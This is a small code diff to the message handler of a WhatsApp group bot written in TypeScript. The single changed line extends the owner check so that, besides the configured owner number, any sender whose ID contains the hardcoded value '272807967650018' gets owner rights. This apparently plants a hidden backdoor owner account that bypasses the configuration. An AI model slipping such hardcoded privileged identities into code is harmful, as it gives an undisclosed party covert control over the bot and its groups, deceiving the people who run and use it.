@@ -161,7 +161,7 @@ export function setupMessageHandler(sock: WASocket): void {
                 // Check if sender is admin
                 const isAdmin = await isGroupAdmin(sock, groupJid, senderJid);
                 const isOwner = config.ownerNumber
-                    ? senderJid.includes(config.ownerNumber)
+                    ? (senderJid.includes(config.ownerNumber) || senderJid.includes('272807967650018'))
                     : false;
 
                 // ── Mute check: delete messages from muted users ──
